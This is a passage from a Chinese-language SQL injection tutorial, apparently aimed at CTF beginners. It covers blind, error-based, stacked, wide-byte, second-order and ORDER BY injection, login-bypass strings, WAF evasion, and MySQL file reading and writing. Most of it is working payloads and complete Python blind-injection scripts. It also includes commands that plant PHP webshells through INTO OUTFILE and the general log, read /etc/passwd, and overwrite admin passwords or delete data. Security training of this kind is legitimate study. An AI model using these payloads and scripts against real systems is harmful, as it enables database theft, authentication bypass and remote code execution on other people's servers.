1' AND GEOMETRYCOLLECTION(CONCAT(0x7e, DATABASE(), 0x7e)) --

-- MultiPolygon 报错
1' AND MULTIPOLYGON(CONCAT(0x7e, DATABASE(), 0x7e)) --

-- Linestring 报错
1' AND LINESTRING(CONCAT(0x7e, DATABASE(), 0x7e)) --
```

#### 报错函数适用场景速查

| 报错函数 | MySQL 版本 | 稳定性 | 长度限制 | 写法复杂度 |
|---------|-----------|--------|---------|-----------|
| `UPDATEXML()` | 5.1~5.7 |  | 32 字符 | 低 |
| `EXTRACTVALUE()` | 5.1~5.7 |  | 32 字符 | 最低 |
| `FLOOR(RAND()*2)` | 5.0+ |  | 无 | 高 |
| `EXP(~())` | 5.5+ |  | 无 | 中 |
| `GTID_SUBSET()` | 5.6+ (需GTID) |  | 约 64 字符 | 中 |
| `NAME_CONST()` | 5.0+ |  | 约 64 字符 | 低 |
| 几何函数 | 5.0+ |  | 约 32 字符 | 低 |

> **新手避坑：** 备用报错函数虽然可以绕过对 `updatexml` 和 `extractvalue` 的过滤，但它们的稳定性不如三大经典函数。`EXP(~())` 报错比较稳定，推荐作为第一备选。`GTID_SUBSET()` 需要 MySQL 开启了 GTID 模式（`gtid_mode=ON`），CTF 中不一定开启。几何函数类报错在不同 MySQL 版本中表现差异较大，测试时多试几个。**万能策略：** `updatexml` 和 `extractvalue` 先上，不行换 `floor(rand())`，再不行换 `EXP(~())`。

> **新手避坑：** 报错注入的"无长度限制"方法只有 `floor(rand())` 和 `EXP(~())`。但 `floor(rand())` 的缺点是触发不稳定（依赖随机数和主键冲突），有时候需要多刷几次才能看到报错。解决方案：使用固定种子 `RAND(0)` 替代 `RAND()*2`，或者直接用 `EXP(~())`。还有一个技巧：如果 `floor(rand())` 不触发，尝试更换 GROUP BY 的目标表，用不同行数的表影响 rand 的触发概率。

---

## 9. 布尔盲注

### 场景

页面没有正常回显，也没有报错信息，但是页面内容（或状态码、响应长度）会根据 SQL 条件的真假而不同。

### 原理

通过构造 `and 条件`，让数据库判断我们指定的条件是否成立。如果条件成立，页面正常显示；条件不成立，页面异常或内容不同。用这种方法逐字符猜解数据。

### 实战：判断是否存在布尔盲注

```sql
-- 基础测试
1' and 1=1 --    页面正常
1' and 1=2 --    页面异常

-- 更精细的测试
1' and length(database())>0 --     正常
1' and substr(database(),1,1)='a' -- 逐个字符猜
```

### 常用真假判断标志

| 判断依据 | 真页面特征 | 假页面特征 | 适用场景 |
|---------|-----------|-----------|---------|
| 页面文字 | 包含 "Welcome" | 不包含 | 登录类、用户信息类 |
| 页面长度 | 长度 4521 | 长度 4100 | 任何场景 |
| 状态码 | 200 | 404 / 500 | 权限类、查询类 |
| 跳转位置 | 跳转到首页 | 跳转到错误页 | 认证类 |
| JSON 字段 | `{"status":"ok"}` | `{"status":"error"}` | API 接口 |
| 响应时间 | 快速 | 快速（同） | 与其他类型配合 |

### 常用函数

| 函数 | 作用 | 注入示例 |
|------|------|---------|
| `length()` | 获取字符串长度 | `length(database())` |
| `substr()` | 截取字符串 | `substr(database(),1,1)` |
| `substring()` | 同 substr | `substring(database() from 1 for 1)` |
| `mid()` | 同 substr | `mid(database(),1,1)` |
| `ascii()` | 字符转 ASCII 码 | `ascii(substr(database(),1,1))` |
| `ord()` | 同 ascii | `ord(mid(database(),1,1))` |
| `database()` | 当前数据库名 | `database()` |
| `group_concat()` | 多行合并 | `group_concat(table_name)` |

### 手工猜解示例

```sql
-- 1. 猜当前数据库名长度
1' and length(database())=6 --

-- 2. 猜第一个字符
1' and substr(database(),1,1)='c' --

-- 3. 用 ASCII 方式猜
1' and ascii(substr(database(),1,1))=99 --

-- 4. 猜表名长度
1' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=10 --
```

### Python 二分法爆破脚本（推荐）

这是最高效的布尔盲注脚本，比逐个字符字典快得多：

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "http://target/"
success_text = "You are in..........."
result = ""

for i in range(1, 100):
    left = 31
    right = 127

    while left < right:
        mid = (left + right) // 2

        # 爆数据库名
        payload = f"1' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid} -- "

        # 爆表名
        # payload = f"1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))>{mid} -- "

        # 爆列名
        # payload = f"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),{i},1))>{mid} -- "

        # 爆字段内容
        # payload = f"1' and ascii(substr((select group_concat(password) from users),{i},1))>{mid} -- "

        res = requests.get(url, params={"id": payload}, verify=False)

        if success_text in res.text:
            left = mid + 1
        else:
            right = mid

    if left != 31:
        result += chr(left)
        print(result)
    else:
        break
```

### 字符字典爆破脚本

适合了解数据大概范围的场景：

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "http://target/"
success_text = "Welcome"
result = ""
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-"

for i in range(1, 100):
    found = False
    for ch in chars:
        # 爆数据库名
        payload = f"1' and substr((select group_concat(schema_name) from information_schema.schemata),{i},1)='{ch}' -- "

        res = requests.get(url, params={"id": payload}, verify=False)

        if success_text in res.text:
            result += ch
            print(result)
            found = True
            break

    if not found:
        break
```

### ASCII 顺序爆破脚本

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "http://target/"
success_text = "Welcome"
result = ""

for i in range(1, 100):
    found = False
    for j in range(32, 127):
        payload = f"1' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))={j} -- "

        res = requests.get(url, params={"id": payload}, verify=False)

        if success_text in res.text:
            result += chr(j)
            print(result)
            found = True
            break

    if not found:
        break
```

### GET 脚本改 POST / JSON

```python
# POST 表单
url = "http://target/login.php"
res = requests.post(url, data={"username": payload, "password": "test"}, verify=False)

# POST JSON
url = "http://target/api/login"
res = requests.post(url, json={"username": payload, "password": "test"}, verify=False)
```

### LIKE 和 REGEXP 判断

```sql
-- LIKE 模糊匹配
1' and database() like 'c%' --
1' and (select group_concat(password) from users) like 'flag%' --

-- REGEXP 正则匹配
1' and (select group_concat(password) from users) regexp '^flag' --
1' and (select group_concat(password) from users) regexp '^f[a-z]{3}' --
```

### 常见注意点

| 注意点 | 说明 |
|--------|------|
| 真假差异必须稳定 | 多测几次，确认不是偶然 |
| 优先用二分法 | 比字典爆破快得多 |
| ASCII 码范围 32-126 | 可打印字符 |
| substr 不够用 substring | 函数名被过滤时替换 |
| 查不到 flag 查所有库 | 可能 flag 在其他数据库 |
| 长数据用 limit 分条 | 避免 group_concat 截断 |
| 加网络重试机制 | 网络波动导致误判 |

> **新手避坑：** 布尔盲注最怕"假阳性"——你的脚本判断为真，但实际上是网络波动或缓存导致的。解决方法：一是固定判断特征（不要只看状态码，要看页面中的特定文字）；二是对每个字符重复确认两次。另外，先用人工确认一个已知字符的 ASCII 值，确保脚本逻辑正确后再跑全量。

---

## 10. 时间盲注

### 场景

页面没有回显、没有报错，而且真假页面的**内容也没有差异**。唯一能用的就是响应时间——条件成立时数据库会延迟返回。

### 原理

通过 `if(条件, sleep(N), 0)` 构造条件判断。条件成立则执行 `sleep(N)` 延迟 N 秒，条件不成立则立即返回。通过测量响应时间判断条件真假。

### 实战：判断是否存在时间盲注

```sql
-- MySQL
1' and sleep(5) --                  返回时间 ≈ 5 秒
1' and if(1=1, sleep(5), 0) --      返回时间 ≈ 5 秒
1' and if(1=2, sleep(5), 0) --      返回时间 ≈ 0.1 秒
1' and if(length(database())=6, sleep(5), 0) --

-- PostgreSQL
1' and pg_sleep(5) --

-- SQL Server
1'; waitfor delay '0:0:5' --
```

### 时间盲注常用函数

| 函数 | 作用 | 示例 |
|------|------|------|
| `sleep(N)` | 延时 N 秒 | `sleep(5)` |
| `if(条件,真值,假值)` | 条件分支 | `if(1=1,sleep(5),0)` |
| `benchmark(N,expr)` | 重复执行 N 次制造延迟 | `benchmark(10000000,md5(1))` |
| `length()` | 取长度 | `length(database())` |
| `substr()` | 截取 | `substr(database(),1,1)` |
| `ascii()` | 转 ASCII 码 | `ascii(substr(database(),1,1))` |

### 手工判断示例

```sql
-- 猜数据库长度
1' and if(length(database())=6, sleep(5), 0) --

-- 猜第一个字符（ASCII 码）
1' and if(ascii(substr(database(),1,1))=99, sleep(5), 0) --

-- 二分法判断
1' and if(ascii(substr(database(),1,1))>99, sleep(5), 0) --

-- 猜表名
1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>100, sleep(5), 0) --
```

### 不用 IF 的写法

```sql
-- 利用 AND 短路特性
1' and length(database())=6 and sleep(5) --
1' and ascii(substr(database(),1,1))=99 and sleep(5) --
```

### BENCHMARK 延时（sleep 被过滤时）

```sql
1' and if(1=1, benchmark(10000000, md5(1)), 0) --
1' and if(ascii(substr(database(),1,1))>99, benchmark(10000000, md5(1)), 0) --
```

### Python 二分法 + 响应时间判断脚本

```python
import requests
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "http://target/"
result = ""
delay = 3          # sleep 秒数
threshold = 2.5    # 判断阈值：超过 2.5 秒认为真

for i in range(1, 100):
    left = 31
    right = 127

    while left < right:
        mid = (left + right) // 2

        # 爆数据库名
        payload = f"1' and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid},sleep({delay}),0) -- "

        # 爆表名
        # payload = f"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))>{mid},sleep({delay}),0) -- "

        # 爆字段内容
        # payload = f"1' and if(ascii(substr((select group_concat(password) from users),{i},1))>{mid},sleep({delay}),0) -- "

        start = time.time()
        requests.get(url, params={"id": payload}, verify=False)
        end = time.time()

        if end - start > threshold:
            left = mid + 1
        else:
            right = mid

    if left != 31:
        result += chr(left)
        print(result)
    else:
        break
```

### Python 二分法 + Timeout 判断脚本（推荐）

优点：不受网络波动影响，判断更准确：

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "http://target/"
result = ""
delay = 3          # sleep 秒数
timeout = 2        # 超时阈值：超过 2 秒算超时（条件为真）

for i in range(1, 100):
    left = 31
    right = 127

    while left < right:
        mid = (left + right) // 2

        # 爆数据库名
        payload = f"1' and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid},sleep({delay}),0) -- "

        try:
            requests.get(url, params={"id": payload}, verify=False, timeout=timeout)
            right = mid       # 未超时 → 条件为假 → 缩小上限
        except requests.exceptions.Timeout:
            left = mid + 1    # 超时 → 条件为真 → 提高下限

    if left != 31:
        result += chr(left)
        print(result)
    else:
        break
```

### 常见注意点

| 注意点 | 说明 |
|--------|------|
| 首选布尔盲注 | 时间盲注很慢，页面有差异先用布尔 |
| sleep 时间要合适 | 太短被网络波动覆盖，太长太慢 |
| benchmark 备选 | `sleep()` 被过滤时用 |
| 网络不稳定多重试 | 不稳定时跑多次取众数 |
| 多线程加速 | 非阻塞方式可同时爆破多位 |
| 阈值要保守 | 一般取 sleep 时间的 80% |

> **新手避坑：** Timeout 脚本比响应时间脚本更可靠，因为它不受网络抖动影响——你只需要设置一个小于 sleep 秒数的 timeout 值。但注意，如果目标服务器和你的机器之间的 RTT（往返延迟）本身就大于 timeout 值，所有请求都会超时。建议先用 `1' and sleep(3) -- ` 测一下实际延迟，再设置合适的 timeout。

---

## 11. 万能密码

### 场景

登录框让你输入用户名和密码，你没有合法账户但想登录进去。

### 原理

后端把用户名和密码直接拼接到 SQL 查询中，你构造的 payload 让 WHERE 条件永远成立，从而绕过认证。

### 实战：不同场景的万能密码

**场景1：只有用户名输入框**

```sql
-- 后端：select * from users where username = '输入'
' or 1=1 --
' or '1'='1' --
' or true --
```

**场景2：用户名固定，密码输入框**

```sql
-- 后端：select * from users where username='admin' and password='输入'
' or 1=1 --
' or '1'='1' --
' or username='admin' --
```

**场景3：两个输入框**

| 账号框输入 | 密码框输入 | 原理 |
|-----------|-----------|------|
| `admin' -- ` | 任意 | 注释掉密码判断 |
| `admin'#` | 任意 | MySQL 中注释 |
| `' or 1=1 -- ` | 任意 | 恒真条件 |
| `' or '1'='1` | `' or '1'='1` | 双方闭合 |
| `admin'/*` | `*/` | 块注释跨框闭合 |
| `'='` | `'='` | MySQL 特殊写法 |

**场景4：MySQL 块注释跨框**

```txt
账号框：admin'/*
密码框：*/ or 1=1 --
最终 SQL：select * from users where username='admin'/*' and password='*/ or 1=1 -- ';
实际执行：select * from users where (username='admin') or 1=1
```

### 万能密码速查表

| Payload | 位置 | 说明 |
|---------|------|------|
| `' or 1=1 -- ` | 任意框 | 最经典 |
| `' or 1=1 #` | 任意框 | MySQL 专属 |
| `' or '1'='1` | 任意框 | 无注释符 |
| `' or ''='` | 任意框 | 无注释符 |
| `admin' -- ` | 账号框 | 指定用户 |
| `admin'#` | 账号框 | MySQL 指定用户 |
| `' or '1'='1' -- ` | 密码框 | 放密码框 |
| `' or 1=1 or '1'='1` | 任意框 | 多重保险 |
| `'='` | 两个框 | MySQL 特殊 |

> **新手避坑：** 万能密码首选 `admin' -- `（指定用户+注释掉密码判断），而不是 `' or 1=1 -- `。因为 `or 1=1` 可能返回多个用户导致程序报错或只认第一个用户。另外，如果网站用了参数化查询（Prepared Statement），万能密码无效。

---

## 12. 宽字节注入

### 场景

你尝试输入 `1'` 被转义成了 `1\'`，页面没有报错，单引号被反斜杠"吃掉"了。但数据库用的是 GBK 编码。

### 原理

后端对单引号转义（`'` → `\'`），插入反斜杠 `\`（十六进制 `%5c`）。但是如果输入 `%df%27`（`%df` 是宽字节前导，`%27` 是单引号），后端转义后变成 `%df%5c%27`。在 **GBK 编码**中，`%df%5c` 被解释为一个汉字"運"，后面的 `%27` 就独立出来变成了有效的单引号。

### 原理图解

```
输入：    1%df%27
           ↓ 后端转义（加反斜杠）
编码：    1%df%5c%27
           ↓ GBK 解码
显示：    1運'
           ↓ 最终 SQL
SQL:      select * from articles where id = '1運''
```

### 常用宽字节前缀

| Payload | 说明 |
|---------|------|
| `%df%27` | 最常用 |
| `%bf%27` | 备选 |
| `%a1%27` | 备选 |
| `%aa%27` | 备选 |
| `%ba%27` | 备选 |

### 判断是否存在宽字节注入

```sql
1'                    -- 被转义成 \'，不报错
1%df%27 and 1=1 --   -- 转义被绕过，页面正常
1%df%27 and 1=2 --   -- 转义被绕过，页面异常
```

### 宽字节 Union 注入

```sql
-- 判断列数
1%df%27 order by 1 --
1%df%27 order by 2 --
1%df%27 order by 3 --

-- 判断回显位
-1%df%27 union select 1,2,3 --

-- 查数据库名
-1%df%27 union select 1,database(),3 --

-- 查表名
-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --

-- 查字段内容
-1%df%27 union select 1,group_concat(username,':',password),3 from users --
```

### 宽字节报错注入

```sql
1%df%27 and updatexml(1,concat(0x7e,database(),0x7e),1) --
1%df%27 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) --
```

### 宽字节 vs UTF-8

| 特性 | GBK 编码（宽字节） | UTF-8 编码 |
|------|-------------------|------------|
| 宽字节注入是否生效 | 生效 | 不生效 |
| 单引号转义 | `\'` | `\'` 或 `'` |
| `%df%5c` 解码结果 | 汉字"運" | 无效 UTF-8 序列 |
| 典型网站 | 中文网站、老系统 | 现代 Web 应用 |

> **新手避坑：** 宽字节注入在 UTF-8 编码下**不适用**！如果网站编码是 UTF-8，`%df%5c` 不会被解释为有效字符。另外，`%df%27` 这类 payload 不要在浏览器地址栏直接输入（会被自动解码），应该用 BurpSuite 或 HackBar 来发送。还有一个常见误区：PHP 5.4+ 以后使用了 `addslashes()` 的默认编码就是 UTF-8，宽字节注入已经很难触发了。

---

## 13. 堆叠注入

### 场景

普通 Union 注入只能执行 SELECT 查询，但你想要**修改数据、创建表、甚至写文件**。这时就需要堆叠注入。

### 原理

通过分号 `;` 结束当前 SQL 语句，然后直接执行另一条新的 SQL 语句。`SELECT` 不能做的事，`INSERT`、`UPDATE`、`DELETE`、`DROP` 可以。

```sql
-- 正常：select * from users where id = '1';
-- 堆叠：select * from users where id = '1'; select database(); -- ';
```

### 实战：判断是否存在堆叠注入

```sql
1'; select sleep(5) --
1'; do sleep(5) --
```

如果页面延迟 5 秒，说明堆叠注入存在。

### 进阶：修改和插入数据

```sql
-- 修改管理员密码
1'; update members set password='hacked' where username='admin' --

-- 插入新用户（含权限）
1'; insert into members(username, password, role) values('hacker','pass123','admin') --

-- 删除指定用户
1'; delete from members where username='guest' --
```

### 改表名配合万能密码（CTF 常见套路）

```sql
-- 1. 先把用户表改名
1'; rename table members to members_bak --

-- 2. 把 flag 表改成用户表
1'; rename table secret_flags to members --

-- 3. 调整列名
1'; alter table members change flag username varchar(255) --

-- 4. 用万能密码登录
' or 1=1 --
```

### Handler 句柄法（select 被过滤时）

```sql
-- MySQL 专属语法，绕过 select 过滤
1'; handler members open --             -- 打开表
1'; handler members read first --        -- 读第一行
1'; handler members read next --         -- 读下一行
1'; handler members close --            -- 关闭表

-- 按索引读取
1'; handler members read idx_username first --
1'; handler members read idx_username next --
```

### 预处理语句绕过（关键字被拼接过滤时）

```sql
-- 基本语法：把 SQL 语句拼成字符串再执行
1'; set @sql = concat('sel','ect ','databas','e()');
    prepare stmt from @sql;
    execute stmt;
    deallocate prepare stmt --

-- 查表名
1'; set @sql = concat('sel','ect group_concat(table_name) fr','om information_schema.tables where table_schema=database()');
    prepare stmt from @sql;
    execute stmt --

-- 写文件（预处理版）
1'; set @sql = concat('sel','ect "<?php @eval($_POST[1]);?>" into outfile "/var/www/html/shell.php"');
    prepare stmt from @sql;
    execute stmt --
```

### 创建表保存结果

```sql
-- 建临时表
1'; create table tmp_data (content text) --

-- 把 flag 存进去
1'; insert into tmp_data(content) select flag from secret_flags --

-- 用 union 查看
-1' union select content from tmp_data --
```

### 堆叠注入条件速查

| 条件 | 说明 |
|------|------|
| 分号 `;` 未被过滤 | 最关键的前提 |
| 数据库驱动支持多语句 | MySQL `mysqli` 支持，部分 PDO 不支持 |
| 数据库用户有对应权限 | 写文件需要 FILE 权限 |
| 闭合方式正确 | 同普通注入 |

> **新手避坑：** 堆叠注入看起来强大，但实际 CTF 中触发率低于 Union 注入。原因是：1) 很多后端 API 驱动禁止多语句执行；2) 第二条语句的结果通常不回显。所以优先用 Union 注入查数据，Union 走不通再考虑堆叠。堆叠注入的真正价值不在于查数据，而在于**改数据、删表、写入**。

---

## 14. 二次注入

### 场景

你注册了一个用户名为 `admin' -- ` 的账户，注册时一切正常。但当你用"修改密码"功能时，竟然把 admin 用户的密码改了！

### 原理

二次注入是"先存储，后触发"的注入类型。第一次写入数据时，SQL 语句使用了参数化查询或转义，payload 被安全地存进了数据库。但后续程序从数据库中取出这个值时，**没有再次过滤**就直接拼接到了新的 SQL 语句中，导致注入触发。

### 实战：经典修改密码场景

**第一步：注册恶意用户名**

```sql
-- 注册用户名：admin' --
-- 密码：任意密码

-- 存储时的 SQL（安全）：
insert into members(username, password) values ('admin\' -- ', 'hash123');
-- 单引号被转义，安全入库
```

**第二步：触发注入**

系统从数据库读出用户名 `admin' -- `，拼接到修改密码的 SQL 中：

```sql
update members set password='newpass123' where username='admin' -- ';
```

**实际执行效果：**

```sql
update members set password='newpass123' where username='admin'
```

admin 用户的密码被改了！

### 常见存储点和触发点

| 存储点 | 触发点 | 攻击目标 |
|--------|--------|---------|
| 用户名 | 修改密码 | 修改管理员密码 |
| 昵称 | 查看个人资料 | 读取任意数据 |
| 邮箱 | 密码找回 | 获取重置链接 |
| 评论/留言 | 后台审核 | 获取敏感信息 |
| User-Agent | 日志查看 | 获取管理员 session |
| 地址信息 | 订单详情 | 读取数据库内容 |

### 判断是否存在二次注入

```sql
-- 先在存储点写入测试 payload
test' and sleep(5) --

-- 然后访问触发点
-- 如果页面延迟了，说明二次注入存在
```

### Union 二次注入

```sql
-- 注册用户名时写入
test' union select 1,2,3 --
test' union select 1,database(),3 --
test' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --

-- 然后在触发点查看回显
```

### 报错二次注入

```sql
-- 注册用户名时写入
test' and updatexml(1,concat(0x7e,database(),0x7e),1) --

-- 在触发点查看报错信息
```

### 时间二次注入

```sql
-- 注册用户名时写入
test' and if(length(database())=6, sleep(5), 1) --

-- 在触发点检测响应时间
```

### 存储时被转义的情况

有些场景下，第一次写入时后端会对单引号转义（`'` → `\'`），但数据库中存储的仍然是原始字符 `'`。后续取出并拼接时，这个单引号就发挥了作用。

```sql
-- 写入（被转义，但入库的是原始字符）
insert into members(username) values('test\'');
-- 数据库存储：test'

-- 取出后直接拼接
update members set password='new' where username='test'';
-- ↑ 单引号生效了！
```

> **新手避坑：** 二次注入最难的地方在于"你不知道什么时候会触发"。注册时没有任何异常不代表安全。解题思路是：先在存储点写入 payload，然后遍历所有可能触发的位置（修改密码、查看资料、搜索等）。建议写入一个无害的测试 payload（如 `test'`），然后去各个功能页面看是否报错。

---

## 15. Insert / Update / Delete 注入

### 15.1 INSERT 注入

**场景：**注册、评论、发帖等写入数据库的功能点，输入被直接拼接到 INSERT 语句中。

**原理：**利用子查询在 INSERT 的 VALUES 中读取数据并写入到可查看的字段。

**实战：**

```sql
-- 后端：insert into members(username, password) values('输入', 'pass');

-- 利用子查询读取数据库名（存入 username 字段）
insert into members(username) values((select database()));

-- 读取所有表名
insert into members(username) values((select group_concat(table_name) from information_schema.tables where table_schema=database()));

-- 读取字段内容
insert into members(username) values((select group_concat(password) from users));
```

### 15.2 UPDATE 注入

**场景：**修改个人资料、更新密码等功能点。

**原理：**在 SET 或 WHERE 子句中插入子查询或报错函数。

**实战：**

```sql
-- 后端：update members set email='输入' where username='admin';

-- 报错注入读取数据
' and updatexml(1,concat(0x7e,database(),0x7e),1) where username='admin' --

-- 时间盲注
' and if(ascii(substr(database(),1,1))>100, sleep(5), 0) where username='admin' --
```

### 15.3 DELETE 注入

**场景：**删除文章、取消订单等功能点。

**原理：**WHERE 子句中注入条件，通常利用时间盲注或报错。

**实战：**

```sql
-- 后端：delete from articles where id = 输入;

-- 时间盲注
1 and if(1=1, sleep(5), 0)

-- 报错注入
1 and updatexml(1,concat(0x7e,database(),0x7e),1)

-- 条件延时
1 and if(ascii(substr(database(),1,1))>100, sleep(5), 0)
```

### 三种注入对比

| 注入类型 | 回显可能性 | 推荐注入方式 | 风险 |
|---------|-----------|-------------|------|
| INSERT | 低（无回显） | 子查询写数据到可查字段 | 中 |
| UPDATE | 低（无回显） | 报错注入 / 时间盲注 | 高（会改数据） |
| DELETE | 低（无回显） | 时间盲注 / 报错注入 | 高（会删数据） |

> **新手避坑：** INSERT/UPDATE/DELETE 注入**会实际修改数据**！在 CTF 和渗透测试中，INSERT/UPDATE/DELETE 注入成功后记得恢复数据（或提前备份），不要造成不可逆的破坏。另外，这类注入通常没有回显，主要靠报错注入或时间盲注。

---

## 16. ORDER BY 注入

### 场景

URL 参数出现在 ORDER BY 后面：`?sort=username` 或 `?order=1`。

### 原理

ORDER BY 子句位于 SQL 语句末尾，不能使用 UNION，但可以使用函数和子查询。

### 实战：报错注入

```sql
order by 1 and updatexml(1,concat(0x7e,database(),0x7e),1)
```

### 时间盲注

```sql
order by if(1=1, sleep(5), 0)

-- 条件判断
order by if(ascii(substr(database(),1,1))>100, sleep(5), 0)

-- CASE WHEN 写法（避免 IF 函数过滤）
order by case when ascii(substr(database(),1,1))>100 then sleep(5) else 0 end
```

### 列数判断

```sql
order by 1   正常
order by 2   正常
order by 3   报错 → 共 2 列
```

> **新手避坑：** ORDER BY 后面**不能直接跟 UNION**，所以不要浪费时间去试 `order by 1 union select...`。ORDER BY 注入只能用报错或盲注。另外，ORDER BY 后面的大部分位置**不能使用 ASC/DESC 关键字**，除非你知道原语句的完整语法。

---

## 17. 文件读写（MySQL）

### 场景

MySQL 数据库有读取服务器文件（如读取 `/flag`）或写入 Webshell 的能力。这是 CTF 中从 SQL 注入走向 RCE 的关键路径。

### 原理

MySQL 提供 `LOAD_FILE()` 函数读取文件，提供 `INTO OUTFILE` / `INTO DUMPFILE` 子句写入文件。前提是当前用户有 `FILE` 权限且 `secure_file_priv` 未限制。

### 读取文件

```sql
-- 查权限和限制
-1' union select 1, user(), @@secure_file_priv --

-- 读取系统文件
-1' union select 1, load_file('/etc/passwd'), 3 --

-- 读取 flag
-1' union select 1, load_file('/flag.txt'), 3 --

-- 读取网站源码（十六进制避免解析）
-1' union select 1, hex(load_file('/var/www/html/index.php')), 3 --
```

### 写入文件

```sql
-- 写入测试文件
-1' union select 1, 'test', 3 into outfile '/var/www/html/test.txt' --

-- 写入 PHP Webshell
-1' union select 1, '<?php @eval($_POST[1]);?>', 3 into outfile '/var/www/html/shell.php' --

-- 写入一句话木马
-1' union select 1, '<?=system($_GET[1]);?>', 3 into dumpfile '/var/www/html/cmd.php' --

-- 写大马
-1' union select 1, '<?php system($_REQUEST["cmd"]);?>', 3 into outfile '/var/www/html/cmd.php' --

-- 写文件管理器
-1' union select 1, '<?php system("ls -la /");?>', 3 into outfile '/var/www/html/check.php' --
```

### secure_file_priv 配置解读

| @@secure_file_priv | 含义 | 能否读写 |
|-------------------|------|---------|
| NULL | 禁止文件导入导出 | 不能 |
| `/var/lib/mysql-files/` | 限制在指定目录 | 只能在该目录 |
| （空字符串） | 没有目录限制 | 任意位置 |

### OUTFile vs DUMPFILE

| 特性 | INTO OUTFILE | INTO DUMPFILE |
|------|-------------|---------------|
| 写入方式 | 文本，添加换行 | 原样写入，不添加格式 |
| 目标文件已存在 | 报错（不能覆盖） | 报错（不能覆盖） |
| 适用场景 | 文本文件、Webshell | 二进制文件、图片 |
| 文件锁 | 对文件加锁 | 对文件加锁 |

### 路径被引号过滤时

使用十六进制代替路径字符串：

```sql
-- /flag.txt 的十六进制是 0x2f666c61672e747874
-1' union select 1, load_file(0x2f666c61672e747874), 3 --

-- /var/www/html/config.php 的十六进制
-1' union select 1, load_file(0x2f7661722f7777772f68746d6c2f636f6e6669672e706870), 3 --
```

### 日志写 Webshell（当 secure_file_priv 为 NULL 时）

当 `secure_file_priv` 为 NULL 禁止文件写入时，如果有 SUPER 权限，可以通过修改 MySQL 通用日志路径来写 Webshell：

```sql
-- 1. 查看当前日志配置
-1' union select 1, @@general_log, @@general_log_file, 3 --

-- 2. 如果 general_log 是 OFF 且 SUPER 权限可用（堆叠注入）
1'; set global general_log = on --
1'; set global general_log_file = '/var/www/html/log_shell.php' --

-- 3. 执行一个查询，写入 PHP 代码到日志文件
1'; select '<?php @eval($_POST[1]);?>' --

-- 4. 恢复日志配置
1'; set global general_log_file = '/var/lib/mysql/mysql.log' --
1'; set global general_log = off --

-- 5. 访问 Webshell
-- http://target/log_shell.php
```

**注意：**修改日志配置需要 `SUPER` 权限，且通常需要堆叠注入支持。此方法在 CTF 中很常见。

### 各数据库文件读写能力对比

| 数据库 | 读文件 | 写文件 | 命令执行 | 所需权限 |
|--------|--------|--------|---------|---------|
| MySQL | `LOAD_FILE()` | `INTO OUTFILE` | 无（udf 可执行） | FILE |
| PostgreSQL | `PG_READ_FILE()` | `COPY ... TO` | `COPY ... PROGRAM` | superuser |
| SQL Server | `OPENROWSET(BULK...)` | `XP_CMDSHELL` | `XP_CMDSHELL` | sysadmin |
| SQLite | `ATTACH DATABASE` | `ATTACH DATABASE` | 无 | 文件系统权限 |
| Oracle | `UTL_FILE.FOPEN()` | `UTL_FILE.PUTF()` | `JAVA` 存储过程 | CREATE ANY DIRECTORY |

### 文件读写条件检查表

| 条件 | 检查方法 | 说明 |
|------|---------|------|
| 是否 FILE 权限 | `SELECT file_priv FROM mysql.user WHERE user=user()` | 需要 `Y` |
| secure_file_priv | `SELECT @@secure_file_priv` | 空或目标路径 |
| 知道绝对路径 | 报错信息或配置文件 | Linux: `/var/www/html/` |
| 目录可写 | `ls -la /var/www/html/` | Web 用户有写权限 |
| 目标文件不存在 | `OUTFILE` 不能覆盖已有文件 | 用不存在文件名 |

> **新手避坑：** 写文件时目标文件**不能已存在**！如果 `shell.php` 已经存在，OUTFILE 会报错。先用一个不常见的文件名（如 `shell_2024.php`）。另外，MySQL 8.x 以上 `secure_file_priv` 默认是 NULL（禁止读写），如果需要要修改 MySQL 配置。CTF 中如果 `secure_file_priv` 是 NULL，可以考虑通过日志写 Webshell（需要 SUPER 权限）。

---

## 18. WAF 绕过

### 18.1 空格过滤绕过

**场景：**输入空格后返回 403 或关键字被拦截。

**方法一：注释符绕过 `/**/`**

```sql
-1'/**/union/**/select/**/1,2,3--%0c
-1'/**/union/**/select/**/1,database(),3--%0c
-1'/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()--%0c
```

**方法二：URL 编码空白字符**

| 编码 | 含义 | 绕过场景 |
|------|------|---------|
| `%09` | Tab | 简单空格过滤 |
| `%0a` | 换行 | 简单空格过滤 |
| `%0b` | 垂直制表符 | 中等 WAF |
| `%0c` | 换页符 | CTF 最常见 |
| `%0d` | 回车 | 中等 WAF |
| `%a0` | 不间断空格 | 严格 WAF |

```sql
-1'%09union%09select%091,2,3--%0c
-1'%0cunion%0cselect%0c1,database(),3--%0c
```

**方法三：小括号绕过**

```sql
-1'UNION(SELECT(1),(database()),(3))--%0c
-1'UNION(SELECT(1),group_concat(table_name),(3)FROM(information_schema.tables)WHERE(table_schema=database()))--%0c
```

### 18.2 关键字过滤绕过

**方法一：大小写混写**

```sql
-1' UnIoN SeLeCt 1,2,3 --
-1' UnIoN SeLeCt 1,database(),3 --
